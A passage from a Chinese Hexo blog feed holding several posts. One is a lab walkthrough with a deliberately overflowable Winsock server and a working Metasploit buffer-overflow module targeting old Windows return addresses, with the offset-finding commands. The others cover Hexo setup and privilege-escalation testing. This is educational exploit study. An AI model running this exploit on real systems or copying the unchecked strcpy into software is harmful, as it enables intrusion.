<td style="text-align:left">Visual C++ 6.0</td>
<td>其他编辑器生成的PE文件也可以用于本实验，但是实验细节会发生改变</td>
</tr>
<tr>
<td>编译选项</td>
<td style="text-align:left">默认编译选项</td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td style="text-align:left">debug</td>
<td>release版本也可以用于本实验，但是实验细节会发生改变</td>
</tr>
</tbody>
</table>
<h3 id="3、windows主机上存在漏洞的Server程序"><a href="#3、windows主机上存在漏洞的Server程序" class="headerlink" title="3、windows主机上存在漏洞的Server程序"></a>3、windows主机上存在漏洞的Server程序</h3><pre><code>#include &quot;iostream&quot;
#include &quot;winsock2.h&quot;
#pragma comment(lib, &quot;ws2_32.lib&quot;)

using namespace std;

void msg_display(char* buf)
{
    char msg[200];
    strcpy(msg, buf);        //overflow here, copy 0x200 to 200
    cout&lt;&lt;&quot;*****************************&quot;&lt;&lt;endl;
    cout&lt;&lt;&quot;received:&quot;&lt;&lt;endl;
    cout&lt;&lt;msg&lt;&lt;endl;
}

void main()
{
    int sock, msgsock, length, receive_len;
    struct sockaddr_in sock_server, sock_client;
    char buf[0x200];        // noticed it is 0x200

    WSADATA wsa;
    WSAStartup(MAKEWORD(1,1), &amp;wsa);
    if((sock=socket(AF_INET, SOCK_STREAM, 0))&lt;0)
    {
        cout&lt;&lt;sock&lt;&lt;&quot;sock creating error!&quot;&lt;&lt;endl;
        exit(1);
    }
    sock_server.sin_family=AF_INET;
    sock_server.sin_port=htons(7777);
    sock_server.sin_addr.s_addr=htonl(INADDR_ANY);
    if(bind(sock, (struct sockaddr*)&amp;sock_server, sizeof(sock_server)))
    {
        cout&lt;&lt;&quot;binding target server 1.0         &quot;&lt;&lt;endl;
    }
    cout&lt;&lt;&quot;*****************************************************&quot;&lt;&lt;endl;
    cout&lt;&lt;&quot;                exploit target server 1.0          &quot;&lt;&lt;endl;
    cout&lt;&lt;&quot;*****************************************************&quot;&lt;&lt;endl;
    listen(sock, 4);
    length = sizeof(struct sockaddr);
    do{
        msgsock = accept(sock, (struct sockaddr*)&amp;sock_client, (int *)&amp;length);
        if(msgsock==-1)
        {
            cout&lt;&lt;&quot;accept error!&quot;&lt;&lt;endl;
            break;
        }
        else
            do
            {
                memset(buf, 0, sizeof(buf));
                if((receive_len=recv(msgsock, buf, sizeof(buf), 0))&lt;0)
                {
                    cout&lt;&lt;&quot;reading stream message error!&quot;&lt;&lt;endl;
                    receive_len = 0;
                }
                msg_display(buf);        //trigged the overflow
            }while(receive_len);
            closesocket(msgsock);
    }while(1);
    WSACleanup();
}
</code></pre><h3 id="4、开发exploit"><a href="#4、开发exploit" class="headerlink" title="4、开发exploit"></a>4、开发exploit</h3><h4 id="4-1-Ruby开发exploit的正常结构"><a href="#4-1-Ruby开发exploit的正常结构" class="headerlink" title="4.1 Ruby开发exploit的正常结构"></a>4.1 Ruby开发exploit的正常结构</h4><pre><code>class xxx

     def initialize
     #定义模块初始化信息。如漏洞使用的操作系统平台、为不同操作系统指明不同的返回地址
     #指明shellcode中禁止出现的特殊字符、漏洞相关的描述、URL引用、作者信息等
     end

     def exploit
     #将填充物、返回地址、shellcode等组织成最终的attack_buffer，并发送
     end

end
</code></pre><h4 id="4-2-Ruby开发“傻瓜式”Exploit"><a href="#4-2-Ruby开发“傻瓜式”Exploit" class="headerlink" title="4.2 Ruby开发“傻瓜式”Exploit"></a>4.2 Ruby开发“傻瓜式”Exploit</h4><pre><code>#!/usr/bin/env ruby
require &apos;msf/core&apos;      # it is similar to &apos;include&apos; in C language
class Metasploit3 &lt; Msf::Exploit::Remote
    include Msf::Exploit::Remote::Tcp
    def initialize(info = {})
        super(update_info(info,
            &apos;Name&apos;=&gt;&apos;failwest_test&apos;,
            &apos;Platform&apos;=&gt;&apos;win&apos;,
            &apos;Targets&apos; =&gt; [
                [ &apos;Windows 2000&apos;,{ &apos;Ret&apos; =&gt; 0x77F8948B } ],
                [ &apos;Windwos xp sp2&apos;,{ &apos;Ret&apos; =&gt; 0x7C914393 } ],
                [ &apos;Windwos xp sp3&apos;,{ &apos;Ret&apos; =&gt; 0x7c86467b} ],
                ],
            &apos;Payload&apos; =&gt; {
                &apos;Space&apos; =&gt; 300,
                &apos;BadChars&apos; =&gt; &apos;\x00&apos;,
                &apos;StackAdjustment&apos; =&gt; -3500,
                }))
    end

    def exploit
        connect
        attack_buf = &apos;a&apos;*204 + [target[&apos;Ret&apos;]].pack(&apos;V&apos;) + payload.encoded
        sock.put(attack_buf)
        handler
        disconnect
    end

end
</code></pre><p>require指明所需的类库，相当于C语言中的include。所有的MSF模块都需要这句话。<br>运算符&quot;&lt;&quot;在这里表示继承，也就是说，我们所定义的类是由Msf::Exploit::Remote继承而来，可以方便地使用父类的资源。</p>
<p>在类中只定义了两个方法（函数），一是initialize，另一个是exploit。<br>可见为MSF开发模块的过程其实就是实现这两个方法的过程。<br>initialize方法的实现非常简单，在某种意义上更像是在“填空”。从代码中可以看到，initialize实际上值调用了一个方法update_info来初始化info数据结构。初始化的过程通过一系列hash操作完成。<br>(1) Name模块的名称，MSF通过这个名称来引用本模块<br>(2) Platform模块运行平台，MSF通过这个值来为exploit挑选payload。本例中，该值为&quot;win&quot;，所以MSF只选用windows平台的payload，BSD和Linux的payload将被禁用。<br>(3) Targets可以定义多种操作系统版本中的返回地址，本例中定义了Windows2000、Windows XP SP2、Windows XP SP3三种，跳转指令选用了jmp esp，均来自kernel32.dll。本实验时您可能需要根据实验环境重新确定这个值。<br>(4) Payload对shellcode的要求，如大小和禁止使用的字节等。由于漏洞函数使用strcpy函数，故字符结束符0x00应该被禁用。MSF会根据这里的设置自动选用编码算法对shellcode进行加工以满足测试要求。</p>
<p>exploit的定义各位简单。<br>需要说明的只有     attack_buf = &#39;a&#39;*204 + [target[&#39;Ret&#39;]].pack(&#39;V&#39;) + payload.encoded<br>首先选用204个字母&#39;a&#39;填充缓冲区。<br>pack(&#39;V&#39;)的作用时把数据按照DWORD逆序。<br>填充了缓冲区和返回地址后，再选上经过编码的shellcode，就得到最终的attack_buf。其中，payload.encoded会在使用时由MSF提示我们手工设置并生成。</p>
<h4 id="4-3-获取返回地址和覆盖返回地址"><a href="#4-3-获取返回地址和覆盖返回地址" class="headerlink" title="4.3 获取返回地址和覆盖返回地址"></a><font color="#f00">4.3 获取返回地址和覆盖返回地址</font></h4><p>一眼望去，我们仿佛就知道覆盖的函数返回地址是在第200个字节之后，但这是不对的。对于书上给出的exploit，attack_buf = &#39;a&#39;*200 + [target[&#39;Ret&#39;]].pack(&#39;V&#39;) + payload.encoded，但是实验结果并不能复现，所以我们猜测要么是返回地址弄错了，要么就是没有真正覆盖返回地址。</p>
<h5 id="获取返回地址："><a href="#获取返回地址：" class="headerlink" title="获取返回地址："></a>获取返回地址：</h5><p>（1）将windows XP sp3中的kernel32.dll(c:\windows\system32\kernel32.dll)拷贝至kali(/root/Desktop/kernel32.dll)系统<br>（2）使用msfpescan查看jmp esp所在的地址。</p>
<p><img src="/images/2017-06-21/kernel32_jesp.jpg" alt="获取kernel32.dll的jmp esp地址"></p>
<p>从图中可以看出jmp esp所在的地址就是0x7c86467b</p>
<h5 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h5><p>如何发现覆盖的是否是返回地址，就需要对地址一个调试工具了。<br>这里可以使用windbg，也可以使用OllyDbg，为了方便就使用windbg。</p>
<p>（1）首先在windows xp sp2用windbg打开Server服务程序，启动7777端口。<br>（2）在Kali 2.0上生成有序的定长字符串，这儿使用的是msf的工具pattern_create</p>
<pre><code># /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 1000 &gt; /root/Desktop/hi.txt
</code></pre><p>（3）在Kali 2.0上连接Windows xp sp2(ip地址为192.168.124.132)上的Server服务器</p>
<pre><code># cat /root/Desktop/hi.txt | nc 192.168.124.132 7777
</code></pre><p>（4）在windows xp sp2上查看被覆盖的地址，可以从eip上查看</p>
<p><img src="/images/2017-06-21/cover_addr.jpg" alt="覆盖的返回地址"></p>
<p>（5）在Kali 2.0上使用msf工具pattern_offset获取地址偏移</p>
<p><img src="/images/2017-06-21/offset.jpg" alt="获取偏移地址"></p>
<p>所以最终可以确定，当字符串长度大于204个字节的时候，从第204个字节开始，后4个字节覆盖了该函数的返回地址</p>
<h5 id="综合编写exploit"><a href="#综合编写exploit" class="headerlink" title="综合编写exploit"></a>综合编写exploit</h5><p>综合上述找到的返回地址以及覆盖返回地址时前面需要字符串长度，最后可以得到以下几个部分:</p>
<pre><code>&apos;Targets&apos; =&gt; [
                [ &apos;Windows 2000&apos;,{ &apos;Ret&apos; =&gt; 0x77F8948B } ],
                [ &apos;Windwos xp sp2&apos;,{ &apos;Ret&apos; =&gt; 0x7C914393 } ],
                [ &apos;Windwos xp sp3&apos;,{ &apos;Ret&apos; =&gt; 0x7c86467b} ],
                ],


attack_buf = &apos;a&apos;*204 + [target[&apos;Ret&apos;]].pack(&apos;V&apos;) + payload.encoded
</code></pre><h3 id="5、测试结果"><a href="#5、测试结果" class="headerlink" title="5、测试结果"></a>5、测试结果</h3><p><img src="/images/2017-06-21/test_result.jpg" alt="实验测试结果"></p>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="http://pan.baidu.com/s/1jIPzHlG" target="_blank" rel="external">《0day安全 软件漏洞分析技术》</a><br><a href="http://www.2cto.com/article/201308/234430.html" target="_blank" rel="external">2012西电网络攻防大赛 溢出第三题 调试笔记</a></p>
]]></content>
      
        <categories>
            
            <category> 安全工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> metasploit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexo通用配置]]></title>
      <url>/2017/06/20/hexo%E9%80%9A%E7%94%A8%E9%85%8D%E7%BD%AE/</url>
      <content type="html"><![CDATA[<h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3><p>当确定使用Hexo这种静态博客，并使用前面几篇博客所说明的几种安装配置方法之后，基本上自己的博客就已经能够使用了。但是如何解决细节方面的问题呢？这一节就是专门解决这方面问题所开设的博文，博文将会根据自身遇见的问题以及评论者遇到的问题进行汇总整理，不断更新以确保问题能够及时得到解决！</p>
<h5 id="1-hexo文章中如何插入图片"><a href="#1-hexo文章中如何插入图片" class="headerlink" title="1. hexo文章中如何插入图片"></a>1. hexo文章中如何插入图片</h5><p>解决这个问题前，首先得了解<a href="/2017/06/20/hexo的目录结构/">Hexo的结构</a>。</p>
<p>可以看出source目录是创建博文所需要的基本文件，那么可想而知图片也应该放到这个文件夹下。</p>
<p><font color="#f00">使用本地路径</font>：在hexo/source目录下新建一个images文件夹，将图片放入该文件夹下，插入图片时链接即为/images/图片名称。</p>
<p><font color="#f00">使用微博图床</font>，地址<a href="http://weibotuchuang.sinaapp.com/，将图片拖入区域中，会生成图片的URL，这就是链接地址。" target="_blank" rel="external">http://weibotuchuang.sinaapp.com/，将图片拖入区域中，会生成图片的URL，这就是链接地址。</a></p>
<p>毫无疑问推荐使用第一种方法，而markdown引用图片的方法：</p>
<pre><code>![Alt text](/path/to/img.jpg)
</code></pre><h5 id="2-hexo如何分享"><a href="#2-hexo如何分享" class="headerlink" title="2. hexo如何分享"></a>2. hexo如何分享</h5><p>bluelake主题十分友好的是将这些内容封装起来，用户只需要在themes/bluelake/_config.yml中进行配置即可！</p>
<p>相关代码是：</p>
<pre><code>#Share
baidu_share: ## 百度分享
JiaThis_share: ##true ##JiaThis分享
duoshuo_share: #true ##true 多说分享必须和多说评论一起使用。
addToAny_share: # AddToAny share. Empty list hides. List items are service name at url. For ex: email for &apos;&lt;a href=&quot;https://www.addtoany.com/add_to/email?linkurl=...&apos;
#  - twitter
#  - baidu
#  - facebook
#  - google_plus
#  - linkedin
#  - email
#  - qzone
#  - wechat
#  - sina_weibo
</code></pre><p>如果想启用百度分享（包括facebook、twitter、linkedin、有道云笔记、印象笔记、微信、QQ空间、sina微薄），就只需要在baidu_share设置为true就行。</p>
<p>如果想启用JiaThis分享或者多说分享，都是类似的操作，但是问题是这些分享貌似都不可用！</p>
<p>所以笔者采用的是addToAny_share这种方式，这时候只需要将取消上面的特定注释即可。而如果大家还想添加其他类型的分享，也可以使用下面的办法：<br>首先访问网站<a href="https://www.addtoany.com/share#url=https%3A%2F%2Fwww.addtoany.com%2F" target="_blank" rel="external">https://www.addtoany.com/share#url=https%3A%2F%2Fwww.addtoany.com%2F</a></p>
<p>然后画面中会出现下列分享位置<br><img src="/images/2017-06-20/share.jpg" alt="分享地址图片"></p>
<p>点击某个想分享的地址后，页面会出现类似<br><a href="https://www.addtoany.com/add_to/wechat?url=...." target="_blank" rel="external">https://www.addtoany.com/add_to/wechat?url=....</a>.</p>
<p>大家只需要将add_to/后的名字填到addToAny_share后面即可，注意使用yaml语法，也即空两格，横线，空格，分享名</p>
]]></content>
      
        <categories>
            
            <category> Hexo搭建博客网站 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexo的目录结构]]></title>
      <url>/2017/06/20/hexo%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/</url>
      <content type="html"><![CDATA[<p>由于上一篇博文的要求，所以需要整理一下hexo的目录结构，了解hexo每个目录的作用，并且设置全局配置文件 _config.yml 的相关参数，初步定义属于你自己的博客。</p>
<h3 id="1-主目录结构"><a href="#1-主目录结构" class="headerlink" title="1.主目录结构"></a>1.主目录结构</h3><p>主目录，简洁明了</p>
<pre><code>|-- _config.yml
|-- package.json
|-- scaffolds
|-- scripts
|-- source
   |-- _drafts
   |-- _posts
|-- themes
</code></pre><h3 id="2-主目录介绍"><a href="#2-主目录介绍" class="headerlink" title="2.主目录介绍"></a>2.主目录介绍</h3><h4 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h4><p>全局配置文件，网站的很多信息都在这里配置，诸如网站名称，副标题，描述，作者，语言，主题，部署等等参数。这个文件下面会做较为详细的介绍。</p>
<h4 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h4><p>hexo框架的参数，如果不小心把它删掉了，没关系，新建一个文件，将内容写入文件，保存就OK了。里面的参数基本上是固定的，如下：</p>
<pre><code>{
  &quot;name&quot;: &quot;hexo-site&quot;,
  &quot;version&quot;: &quot;0.0.0&quot;,
  &quot;private&quot;: true,
  &quot;hexo&quot;: {
    &quot;version&quot;: &quot;3.3.7&quot;
  },
  &quot;dependencies&quot;: {
    &quot;hexo&quot;: &quot;^3.2.0&quot;,
    &quot;hexo-deployer-git&quot;: &quot;^0.3.0&quot;,
    &quot;hexo-generator-archive&quot;: &quot;^0.1.4&quot;,
    &quot;hexo-generator-baidu-sitemap&quot;: &quot;^0.1.2&quot;,
    &quot;hexo-generator-category&quot;: &quot;^0.1.3&quot;,
    &quot;hexo-generator-feed&quot;: &quot;^1.2.0&quot;,
    &quot;hexo-generator-index&quot;: &quot;^0.2.0&quot;,
    &quot;hexo-generator-json-content&quot;: &quot;^2.2.0&quot;,
    &quot;hexo-generator-sitemap&quot;: &quot;^1.2.0&quot;,
    &quot;hexo-generator-tag&quot;: &quot;^0.2.0&quot;,
    &quot;hexo-renderer-ejs&quot;: &quot;^0.2.0&quot;,
    &quot;hexo-renderer-jade&quot;: &quot;^0.4.1&quot;,
    &quot;hexo-renderer-marked&quot;: &quot;^0.2.10&quot;,
    &quot;hexo-renderer-stylus&quot;: &quot;^0.3.3&quot;,
    &quot;hexo-server&quot;: &quot;^0.2.0&quot;
  }
}
</code></pre><p>参数也很容易理解，一看就明白，该文件基本上也不需要操作，就不多解释了。</p>
<h4 id="scaffolds"><a href="#scaffolds" class="headerlink" title="scaffolds"></a>scaffolds</h4><p>scaffolds是“脚手架、骨架”的意思，当你新建一篇文章（hexo new &#39;title&#39;）的时候，hexo是根据这个目录下的文件进行构建的。基本不用关心。一般而言会有三个不同的选择，分别是draft、post、page三个模板，其中可以自定义需要的项目：</p>
<pre><code>---
title: {{ title }}
date: {{ date }}
categories:
tags:
---
</code></pre><h4 id="scripts"><a href="#scripts" class="headerlink" title="scripts"></a>scripts</h4><p>脚本目录，此目录下的JavaScript文件会被自动执行。</p>
<h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p>这个目录很重要，新建的文章都是在保存在这个目录下的，有两个子目录： _drafts ， _posts 。需要新建的博文都放在 _posts 目录下。</p>
<p>_posts 目录下是一个个 markdown 文件。你应该可以看到一个 hello-world.md 的文件，文章就在这个文件中编辑。</p>
<p>_posts 目录下的md文件，会被编译成html文件，放到 public （此文件现在应该没有，因为你还没有编译过）文件夹下。</p>
<h4 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h4><p>网站主题目录，hexo有非常好的主题拓展，支持的主题也很丰富。该目录下，每一个子目录就是一个主题，我的子目录如下：</p>
<pre><code>|-- landscape
   |--
|-- BlueLake
   |--
</code></pre><p>我装了两个主题， landscape 是我这个hexo版本的默认主题，我自己下载了一个 BlueLake 主题。</p>
<p>你也可以自己下载主题放到该文件下， <a href="https://github.com/tommy351/hexo/wiki/Themes" target="_blank" rel="external">hexo主题传送门</a></p>
<p>主题目录下我们可以进行很多自定义的操作，诸如，给网站添加微博秀、添加评论组件、添加分享组件、添加统计等等，让自己的博客网站更丰富、有趣、实用。</p>
<p>themes目录结构及优化自己的博客，这些内容我会在下一篇博文中介绍。</p>
<h4 id="node-module"><a href="#node-module" class="headerlink" title="node_module"></a>node_module</h4><p>这个目录下存放是通过nodejs下载的相应的hexo插件。</p>
<p>4.后记</p>
<p>好了，本地运行一下</p>
<p>hexo server<br>浏览器访问 localhost:4000/ ，网站的标题，副标题等信息是不是都已经更改了！恭喜你，对自己的博客网站的简单的全局设置已经成功了。</p>
]]></content>
      
        <categories>
            
            <category> Hexo搭建博客网站 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[聊聊越权那些事儿]]></title>
      <url>/2017/06/19/%E8%81%8A%E8%81%8A%E8%B6%8A%E6%9D%83%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在帮合作单位做渗透测试，这是我入行以来第一次参与正式项目。怀着激动而忐忑的心情测了两周，我一共发现了十几个漏洞，其中大部分还都是高危漏洞。终于没有交白卷，忐忑的心情终于放下，现在心里只剩一点小激动，一点成就感。<br>渗透测试是一个既需要技术，又需要经验的活儿。思来想去，趁现在兴奋劲儿还没过，赶紧做一下总结，毕竟经验是通过实战积累的，而实战之后的总结则是最好的方式。由于在测试中发现的漏洞以“越权”类居多，而且本人的人生中提交的<a href="http://bobao.360.cn/learning/detail/3083.html" target="_blank" rel="external">第一个漏洞</a>也是越权，所以这里就先聊聊越权的那些事儿。</p>
<h2 id="什么是越权"><a href="#什么是越权" class="headerlink" title="什么是越权"></a>什么是越权</h2><p>越权（或者说权限提升，Privilege Escalation）是指攻击者能够执行他本身没有资格执行的一些操作，属于“访问控制”的问题。用大白话讲，越权就是“超越了你你拥有的权限，干了你本来不可能干的事儿”。先来几个越权的例子：</p>
<p><a href="http://static.hx99.net/static/bugs/wooyun-2014-057890.html" target="_blank" rel="external">Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限</a></p>
<p><a href="http://static.hx99.net/static/bugs/wooyun-2016-0192676.html" target="_blank" rel="external">前程无忧越权访问个人简历（简单测试上万份简历可查看）</a></p>
<p><a href="http://static.hx99.net/static/bugs/wooyun-2016-0191904.html" target="_blank" rel="external">易企秀越权修改信息致任意用户登入</a></p>
<p>一般情况下，常见的访问控制方式有三种：<font color="#f00">垂直访问控制、水平访问控制和上下文相关</font>的访问控制。垂直访问控制允许不同类型的用户（常见的有基于角色划分用户类型）访问应用程序的不同功能，例如在某系统中普通用户只能执行有限的操作，管理员则拥有最高权限。水平访问控制允许用户访问一组相同类型的资源，如在一个网银系统中，每个用户只能看到他自己的账户信息，只能操作自己的账户进行转账。而上下文相关的访问控制可确保基于应用程序当前的状态，限制用户仅能访问所允许的内容，如在常见的找回/修改密码功能中，必须通过身份验证才能重新设置密码。许多情况下，垂直访问控制与水平访问控制会相交交叠，配合使用。</p>
<p>如果在一个应用中，用户能够访问他本身无权访问的功能或者资源，就说明该应用存在访问控制缺陷，也就是说存在越权漏洞。与访问控制相对应的，将越权分为垂直越权、水平越权和上下文相关的越权。</p>
<font color="#0f0">垂直越权</font>：如果攻击者能够执行某项功能，而他所属的角色并不具备该权限，这就存在垂直越权漏洞，如上述示例中前两个例子。<br><br><font color="#0f0">水平越权</font>：如果攻击者能够执行与自己同级别的其他用户能够执行的操作，这就存在水平越权漏洞，如上述示例中的后两个例子。<br><br><font color="#0f0">上下文相关的越权</font>：如果攻击者能够利用应用程序状态机中的漏洞获得关键资源的访问权限，这就存在上下文相关的越权。如在找回密码过程中，攻击者使用自己的账户信息通过验证，但最终却通过某种手段（例如使用BurpSuite改数据包）将他人的密码进行了修改。上下文相关的越权漏洞一般属于业务逻辑漏洞。<br><br><h2>为什么会出现越权</h2><p>通常情况下，我们使用一个web应用程序提供的功能时，流程是：登录—&gt;提交请求—&gt;验证权限—&gt;数据库查询—&gt;返回结果。如果在“验证权限”环节存在缺陷，那么便会导致越权。<font color="#d00">一种常见的存在越权的情形是：Web应用程序的开发者安全意识不足，认为通过登录即可验证用户的身份，而对用户登录之后的操作不做进一步的权限验证，进而导致越权问题。</font>

</p><h4 id="1-通过隐藏URL实现访问控制"><a href="#1-通过隐藏URL实现访问控制" class="headerlink" title="1. 通过隐藏URL实现访问控制"></a>1. 通过隐藏URL实现访问控制</h4><p>有些应用程序仅通过URL实现访问控制。例如：使用管理员身份登录后可以看到后台管理页面的链接，但是以普通用户登录则看不到该链接。在这种情况下，开发者认为普通用户不知道或者很难猜到后台管理页面的URL，因此实现对管理功能的保护。这其实是一种错误观点，因为攻击者完全有可能通过其他方式（如Google Hacking、HTML/js源码分析、暴力猜解URL、利用其他漏洞等）得到后台管理URL。</p>
<h4 id="2-直接对象引用（Direct-Object-reference）"><a href="#2-直接对象引用（Direct-Object-reference）" class="headerlink" title="2. 直接对象引用（Direct Object reference）"></a>2. 直接对象引用（Direct Object reference）</h4><p>用户提交HTTP请求访问某资源时，被请求资源的标识符常常以GET或者POST请求参数的形式出现在URL查询字符串或者POST请求主体中提交给服务器。例如，在一个网银系统中，用户可以使用以下URL查询账户信息：<br><a href="https://www.onlinebank.com/viewInfo.php?accountId=12345678" target="_blank" rel="external">https://www.onlinebank.com/viewInfo.php?accountId=12345678</a></p>
<p>其中accountId是用户自己的账户ID。用户登录自己的账户后，该URL的链接会出现在用户账户页面中，用户点击即可跳转到账户信息页面。虽然其他用户无法看到这个链接，但是如果该网银系统的访问控制不完善，攻击者完全可以通过枚举accountId进而构造出URL，然后越权查看他人的账户信息。</p>
<h4 id="3-多阶段功能"><a href="#3-多阶段功能" class="headerlink" title="3. 多阶段功能"></a>3. 多阶段功能</h4><p>应用程序的一些功能通过几个阶段执行，并且在执行过程中向服务器依次提交多个请求。这种情况很常见，比如转账功能、找回密码功能等，需要先验证用户的身份，验证通过后才允许用户执行后续动作。多阶段功能本身并没有问题，但是如果开发者认为到达验证过程后续阶段的用户一定已经拥有了相关的权限，并在后续阶段执行操作时不再对用户提交的请求进行验证，那么就很有可能存在越权漏洞。攻击者完全有可能绕过前几阶段的验证阶段，直接执行后续的动作。讲一个我在测试中遇到的真实的案例。</p>
<p>某网站在找回密码时做了很严格的验证，需要验证姓名、手机号、身份证号等信息，验证通过了才能修改密码。那么问题来了，既然做了这么严格的验证，怎么还会存在越权？该网站的“找回密码”功能被设计成了两步（提交了两个请求报文）：第一步验证用户身份，这时提交第一个请求报文，验证成功之后，进入第二步；第二步才是真正的修改密码的动作，而修改密码的POST数据包有3个请求参数，分别是新密码、确认新密码以及账号值。问题就出在第二步，在执行修改密码的动作时，服务器并未验证被修改密码的账户是否是第一步中通过身份验证的账户，因此攻击者可以很容易的以自己的身份通过认证，然后修改第二步提交的报文，实现对任意账户的密码修改！</p>
<h4 id="4-静态文件"><a href="#4-静态文件" class="headerlink" title="4. 静态文件"></a>4. 静态文件</h4><p>有些Web应用程序在用户访问动态页面时会执行相应的访问控制检查，以确定用户是否拥有执行相关操作所需的权限。但是，用户仍然会提交对静态资源的访问请求，如下载网站中的word、excel、pdf文档等。这些文档都是完全静态的资源，其内容直接由Web服务器返回，它并不在服务器上运行。因此，静态资源自身并不能执行任何检查以确认用户的访问权限。如果这些静态资源没有得到有效的保护，那么任何知晓URL命名规则的人都可以越权访问这些静态资源。这种情况的越权也很常见，而且即使不知道URL命名规则，完全有可能通过Google hacking搜索到敏感文件。<br><img src="/images/2017-06-19/Image.png" alt="Image.png"></p>
<h4 id="5-平台配置错误"><a href="#5-平台配置错误" class="headerlink" title="5. 平台配置错误"></a>5. 平台配置错误</h4><p>一些应用程序通过在Web服务器或应用程序平台层使用控件来控制对特定URL路径的访问。例如，有些应用程序会根据用户角色来限制对管理后台路径（如/admin）的访问，如果用户不属于“管理员”组，则拒绝其访问后台管理页面的请求。但是，如果在配置平台及控件时出现错误，就可能导致越权访问。</p>
<h2 id="越权漏洞怎么挖"><a href="#越权漏洞怎么挖" class="headerlink" title="越权漏洞怎么挖"></a>越权漏洞怎么挖</h2><p>首先，找出疑似存在越权漏洞的请求。存在越权漏洞的请求有一定的特点，可以从两个方面下手。</p>
<font color="#f00">从HTTP请求上来说，就是通过BurpSuite抓取在目标站点正常操作所产生的请求数据包，然后找出可能产生越权的请求。一般情况下，类似上文所述URL的GET或者POST请求都要列为重点怀疑对象：<br><a href="https://www.onlinebank.com/viewInfo.php?accountId=12345678" target="_blank" rel="external">https://www.onlinebank.com/viewInfo.php?accountId=12345678</a><br></font>

<font color="#00f">从业务功能上来说，找到容易产生越权的功能点。常见的越权高发功能点有：根据订单号查订单、根据用户ID查看帐户信息、修改/找回密码等。</font>

<p>确定了怀疑对象之后，还需要进一步的分析，以确定是否真的存在越权。这时，需要两个不同的账号（下文分别称为账号A和账号B），以便测试登录账号A后进行操作能否影响到账号B。注意在浏览器中测试时，需要使用两个浏览器分别登录不同的账号，或者使用浏览器的隐私浏览功能登录其中一个账号。</p>
<p>以上文提到的URL为例进行说明。假设账号A的id为1234，账号B的id为5678，BurpSuite中抓取的数据包都是在账号A的。我的习惯做法是：在BurpSuite中将该请求发送到Repeater，然后将参数id的值修改为5678，最后提交修改后的请求包；服务器返回响应后，可以看一下BurpSuite中收到的响应报文。如果响应报文直接提示错误之类的，基本上可以确定此处不存在越权；如果响应报文提示操作成功，此时应该使用浏览器登录账号B进行二次确认，如果数据确实有相应的改动，那么则说明这里存在越权漏洞。这里需要注意：BurpSuite中报文提示操作成功有可能是误报，必须在浏览器中进行再次确认。而对于查询订单这类的请求来说，情况更简单了，修改参数id提交请求，如果返回了账号B的数据，那么就可以确定存在越权。</p>
<p>当然，越权漏洞的攻击点不仅仅存在于请求参数中，还有可能在Cookie中。因此，需要具体情况具体分析，复杂一点的可能还需要Cookie值配合请求参数值以实现越权攻击。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实现应用程序的完善的访问控制不是件容易的事，因此越权漏洞防不胜防。对于开发者而言，一定要有安全意识，时刻保持警惕。以下是几点建议：</p>
<p>永远不要相信来自客户端（用户）的输入！</p>
<p>执行关键操作前必须验证用户身份，多阶段功能的每一步都要验证用户身份。</p>
<p>对于直接对象引用，加密资源ID，以防止攻击者对ID进行枚举。</p>
<p>在前端实现的验证并不可靠，前端可以验证用户的输入是否合规，在服务器端验证用户权限。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://book.douban.com/subject/10793814/" target="_blank" rel="external">黑客攻防技术宝典：Web实战篇（第2版）</a></p>
<p><a href="http://static.hx99.net/static/drops/tips-727.html" target="_blank" rel="external">我的越权之道</a></p>
<p><a href="https://www.icann.org/news/blog/what-is-privilege-escalation" target="_blank" rel="external">What is privilege escalation</a></p>
<p><a href="https://www.outpost24.com/direct-object-references-and-horizontal-privilege-escalation/" target="_blank" rel="external">Direct Object References and Horizontal Privilege Escalation</a></p>
<p>本文参考转载至文章<a href="http://www.hackdig.com/11/hack-40894.htm" target="_blank" rel="external">聊聊越权那些事儿</a></p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 越权 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[BlueLake博客主题的详细配置]]></title>
      <url>/2017/06/17/BlueLake%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E7%9A%84%E8%AF%A6%E7%BB%86%E9%85%8D%E7%BD%AE/</url>
      <content type="html"><![CDATA[<h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3><p><a href="https://github.com/chaooo/hexo-theme-BlueLake" target="_blank" rel="external">BlueLake主题</a>是github作者chaooo写的一个主题，上面经常会有楼层问一些配置的问题，这篇博文主要也是为了解决这些问题。主题以简洁轻量自居(实则简陋)，去掉了Jquery和Fancybox,用原生JS实现站内搜索功能和回到顶部效果。这个主题只是一个小小的雏形，期待您来帮助它成长。</p>
